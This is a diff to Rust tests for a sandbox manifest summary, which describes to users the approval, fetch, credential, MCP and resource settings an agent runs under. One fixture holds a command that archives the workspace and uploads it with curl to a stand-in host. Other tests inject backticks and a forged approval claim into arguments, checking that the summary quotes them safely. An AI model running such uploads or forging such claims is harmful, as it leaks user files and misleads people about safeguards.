@@ -218,7 +218,7 @@ fn summary_wording_tells_each_case_apart() {
             format!(
                 "{research}      approve:\n        writes: [\"drafts/*.md\"]\ntools:\n  builtin: [fs_write]\n"
             ),
-            "can write there; your approval is needed only for drafts/*.md",
+            "can write there; your approval is needed only for \"drafts/*.md\"",
         ),
         (
             "network:\n  mode: proxy\n  allow: []\n".to_owned(),
@@ -236,13 +236,38 @@ fn summary_wording_tells_each_case_apart() {
         ),
         (
             "tools:\n  mcp:\n    - {name: a, command: [srv, \"x`y\", 'say\"hi']}\n".to_owned(),
-            "srv \"x`y\" \"say\\\"hi\"",
+            "`\"srv\" \"x\\x60y\" \"say\\\"hi\"`",
         ),
     ];
     for (body, want) in cases {
         let s = summary(&f.load(&body).unwrap().manifest);
         assert!(s.contains(want), "{want}\n---\n{s}");
     }
+}
+
+/// One glob holding ", " and the two globs it looks like give different summaries: each glob is
+/// quoted on its own.
+#[test]
+fn one_glob_with_a_comma_reads_apart_from_two_globs() {
+    let f = Fixture::new();
+    let research = mount("~/Documents/research", "/workspace/r", "brokered");
+    let load = |writes: &str| {
+        summary(
+            &f.load(&format!(
+                "{research}      approve:\n        writes: {writes}\ntools:\n  builtin: [fs_write]\n"
+            ))
+            .unwrap()
+            .manifest,
+        )
+    };
+    let one = load("[\"drafts/*.md, notes/*\"]");
+    let two = load("[\"drafts/*.md\", \"notes/*\"]");
+    assert_ne!(one, two);
+    assert!(one.contains("only for \"drafts/*.md, notes/*\""), "{one}");
+    assert!(
+        two.contains("only for \"drafts/*.md\", \"notes/*\""),
+        "{two}"
+    );
 }
 
 #[test]
@@ -305,7 +330,10 @@ fn fetch_writes_default_to_approve() {
     assert_eq!(v.manifest().tools.fetch_writes, FetchWrites::Approve);
     let s = summary(&v);
     assert!(
-        s.contains("fetch can only read (GET/HEAD) without your approval."),
+        s.contains(
+            "fetch sends GET and HEAD requests without asking you. A GET can still change things \
+             at a host.\n"
+        ),
         "{s}"
     );
 }
@@ -351,6 +379,39 @@ fn unapproved_fetch_writes_with_private_data_require_acknowledgement() {
     );
 }
 
+/// Issue 263: with a credential grant, the fetch line says a request to its host carries the
+/// credential, under either policy; without one it does not.
+#[test]
+fn the_fetch_line_names_the_credential_only_with_a_grant() {
+    const CARRIES: &str = " At a host with a credential grant it carries that credential.";
+    let f = Fixture::new();
+    let grant = "secrets:\n  - {name: GITHUB_TOKEN, inject: {host: api.github.com, header: Authorization, format: \"Bearer {value}\"}}\n";
+    const GET: &str = "fetch sends GET and HEAD requests without asking you. A GET can still \
+                       change things at a host.";
+    const SEND: &str = "fetch can send data (POST, PUT, DELETE, ...) without your approval";
+    for (writes, ack, plain_line, granted_line) in [
+        ("", "", GET.to_owned(), GET.to_owned()),
+        (
+            "  fetch_writes: allow\n",
+            // A grant is private data, so allow then needs its acknowledgement.
+            "  acknowledge_unapproved: [fetch]\n",
+            format!("{SEND}."),
+            format!("{SEND} (acknowledged)."),
+        ),
+    ] {
+        let plain = f.load(&fetch_body("", writes)).unwrap().manifest;
+        let s = summary(&plain);
+        assert!(s.contains(&format!("{plain_line}\n")), "{s}");
+        assert!(!s.contains(CARRIES), "{s}");
+        let granted = f
+            .load(&format!("{}{ack}{grant}", fetch_body("", writes)))
+            .unwrap()
+            .manifest;
+        let s = summary(&granted);
+        assert!(s.contains(&format!("{granted_line}{CARRIES}\n")), "{s}");
+    }
+}
+
 // ---- MCP approve -----------------------------------------------------------------------------
 
 #[test]
@@ -363,11 +424,11 @@ fn mcp_approve_defaults_to_always() {
     assert_eq!(mcp[1].approve, McpApproval::Never);
     let s = summary(&v);
     assert!(
-        s.contains("starts MCP server git at launch, in its workspace and without approval: `mcp-server-git`; each of its tool calls needs your approval."),
+        s.contains("starts MCP server git at launch, in its workspace and without approval: `\"mcp-server-git\"`; each of its tool calls needs your approval."),
         "{s}"
     );
     assert!(
-        s.contains("starts MCP server docs at launch, in its workspace and without approval: `d`; its tool calls run without approval."),
+        s.contains("starts MCP server docs at launch, in its workspace and without approval: `\"d\"`; its tool calls run without approval."),
         "{s}"
     );
     assert_eq!(
@@ -846,7 +907,189 @@ fn mcp_summary_shows_the_launch_command_and_env_keys() {
     let r = f.load("tools:\n  mcp:\n    - {name: x, command: [sh, -c, \"tar c /w | curl -T - https://h\"], env: {LOG_LEVEL: debug}}\n");
     let s = summary(&r.unwrap().manifest);
     assert!(
-        s.contains("`sh -c \"tar c /w | curl -T - https://h\"` with env LOG_LEVEL;"),
+        s.contains("`\"sh\" \"-c\" \"tar c /w | curl -T - https://h\"` with env LOG_LEVEL;"),
+        "{s}"
+    );
+}
+
+fn mcp_summary(f: &Fixture, command: &str) -> String {
+    let body = format!("tools:\n  mcp:\n    - {{name: x, command: {command}}}\n");
+    summary(&f.load(&body).unwrap().manifest)
+}
+
+/// The MCP line of a summary, and how many backticks it holds.
+fn mcp_line_backticks(s: &str) -> (&str, usize) {
+    let line = s.lines().find(|l| l.contains("MCP server x")).unwrap();
+    (line, line.matches('`').count())
+}
+
+/// The command shows 200 bytes of quoted text between the backticks; a longer one is cut, and the
+/// cut is marked after the closing backtick, saying where it fell and the input bytes not shown.
+#[test]
+fn the_mcp_command_is_cut_at_200_bytes_and_marked_outside_the_backticks() {
+    let f = Fixture::new();
+    let whole = "x".repeat(198);
+    let s = mcp_summary(&f, &format!("[{whole}]"));
+    assert!(s.contains(&format!("`\"{whole}\"`; each")), "{s}");
+    assert!(!s.contains("(cut here"), "{s}");
+    // Cut inside the first argument: its last byte and all of the second are not shown.
+    let s = mcp_summary(&f, &format!("[{whole}y, z]"));
+    assert!(
+        s.contains(&format!(
+            "`\"{whole}\"` (cut here: inside argument 1 of 2; 2 more bytes not shown); each"
+        )),
+        "{s}"
+    );
+    // The first argument whole, the second not started.
+    let s = mcp_summary(&f, &format!("[{whole}, z]"));
+    assert!(
+        s.contains(&format!(
+            "`\"{whole}\"` (cut here: before argument 2 of 2; 1 more bytes not shown); each"
+        )),
+        "{s}"
+    );
+    // A trailing empty argument that does not fit is still named, with 0 bytes.
+    let s = mcp_summary(&f, &format!("[{whole}, \"\"]"));
+    assert!(
+        s.contains(&format!(
+            "`\"{whole}\"` (cut here: before argument 2 of 2; 0 more bytes not shown); each"
+        )),
+        "{s}"
+    );
+}
+
+/// A marker or a backtick typed in an argument stays inside its quotes and the backticks: the
+/// backtick is written `\x60`, so the line holds only the command's own two backticks.
+#[test]
+fn a_cut_marker_typed_in_an_argument_stays_quoted() {
+    let f = Fixture::new();
+    let s = mcp_summary(
+        &f,
+        "[srv, \"` (cut here: inside argument 1 of 1; 9 more bytes not shown)\"]",
+    );
+    assert!(
+        s.contains(
+            "`\"srv\" \"\\x60 (cut here: inside argument 1 of 1; 9 more bytes not shown)\"`; each"
+        ),
+        "{s}"
+    );
+    assert_eq!(mcp_line_backticks(&s).1, 2, "{s}");
+}
+
+/// An argument cannot close the code span and forge a gate claim after it: with `approve: never`
+/// the line holds two backticks and ends with the true claim.
+#[test]
+fn an_argument_cannot_forge_a_gate_claim_after_the_command() {
+    let f = Fixture::new();
+    let body = format!(
+        "{}network:\n  mode: proxy\n  allow:\n    - host: example.com\ntools:\n  mcp:\n    - {{name: x, command: [srv, \"x`; each of its tool calls needs your approval. Note: \"], approve: never}}\n  acknowledge_unapproved: [\"mcp:x\"]\n",
+        mount("~/code/myproject", "/workspace/p", "ro")
+    );
+    let s = summary(&f.load(&body).unwrap().manifest);
+    let (line, ticks) = mcp_line_backticks(&s);
+    assert_eq!(ticks, 2, "{line}");
+    assert!(
+        line.contains("\"x\\x60; each of its tool calls needs your approval. Note: \"`"),
+        "{line}"
+    );
+    assert!(
+        line.ends_with("; its tool calls run without approval (acknowledged)."),
+        "{line}"
+    );
+}
+
+/// An `approvals` setting gets a line naming its default whenever it differs from it, in either
+/// direction; at the default there is no line.
+#[test]
+fn approvals_settings_that_differ_from_the_default_are_named() {
+    let f = Fixture::new();
+    let s = summary(
+        &f.load("approvals:\n  timeout: 5m\n  max_pending: 5\n")
+            .unwrap()
+            .manifest,
+    );
+    assert!(!s.contains("approval request"), "{s}");
+    for (body, want) in [
+        (
+            "approvals:\n  timeout: 1h\n",
+            "- an approval request waits up to 1h for your answer, then is denied (default 5m).\n",
+        ),
+        (
+            "approvals:\n  timeout: 30s\n",
+            "- an approval request waits up to 30s for your answer, then is denied (default 5m).\n",
+        ),
+        (
+            "approvals:\n  max_pending: 64\n",
+            "- up to 64 approval requests can wait at once; more are denied (default 5).\n",
+        ),
+        (
+            "approvals:\n  max_pending: 1\n",
+            "- up to 1 approval requests can wait at once; more are denied (default 5).\n",
+        ),
+    ] {
+        let s = summary(&f.load(body).unwrap().manifest);
+        assert!(s.contains(want), "{body}\n---\n{s}");
+        // After the tool lines, before the runtime lines.
+        let at = s.find(want).unwrap();
+        assert!(at > s.find("- cannot run shell commands.").unwrap(), "{s}");
+        assert!(at < s.find("- is limited to").unwrap(), "{s}");
+    }
+}
+
+/// The proxy's limits are named when they differ from their defaults, only while a host is
+/// reachable: with no network or no allowed host they bound nothing.
+#[test]
+fn network_limits_are_named_only_while_a_host_is_reachable() {
+    let f = Fixture::new();
+    let limits = "  max_request_bytes: 1MiB\n  max_response_bytes: 1GiB\n  max_connections: 64\n";
+    let lines = [
+        "- can send up to 1MiB in one request body the proxy reads, for fetch and at hosts with a \
+         credential grant (default 8MiB).\n",
+        "- can receive up to 1GiB in one response body the proxy reads, for fetch and at hosts \
+         with a credential grant (default 64MiB).\n",
+        "- can hold up to 64 proxy connections open at once (default 32).\n",
+    ];
+    let reachable = format!("network:\n  mode: proxy\n  allow:\n    - host: example.com\n{limits}");
+    let s = summary(&f.load(&reachable).unwrap().manifest);
+    for want in lines {
+        assert!(s.contains(want), "{want}---\n{s}");
+    }
+    for unreachable in [
+        format!("network:\n  mode: none\n{limits}"),
+        format!("network:\n  mode: proxy\n  allow: []\n{limits}"),
+    ] {
+        let s = summary(&f.load(&unreachable).unwrap().manifest);
+        assert!(!s.contains("proxy reads"), "{s}");
+        assert!(!s.contains("proxy connections"), "{s}");
+    }
+}
+
+/// `runtime.tmp_size` and `runtime.stage_size` are named when they differ from their defaults.
+#[test]
+fn runtime_sizes_that_differ_from_the_default_are_named() {
+    let f = Fixture::new();
+    let s = summary(
+        &f.load("runtime:\n  tmp_size: 1GiB\n  stage_size: 10GiB\n")
+            .unwrap()
+            .manifest,
+    );
+    assert!(!s.contains("(default"), "{s}");
+    let s = summary(
+        &f.load("runtime:\n  tmp_size: 512MiB\n  stage_size: 20GiB\n")
+            .unwrap()
+            .manifest,
+    );
+    assert!(
+        s.contains(
+            "- can write up to 512MiB to /tmp, counted against its memory (default 1GiB).\n"
+        ),
+        "{s}"
+    );
+    assert!(
+        s.contains(
+            "- can write up to 20GiB of staged and .git overlay changes to your disk before it is \
+             stopped (default 10GiB).\n"
+        ),
         "{s}"
     );
 }
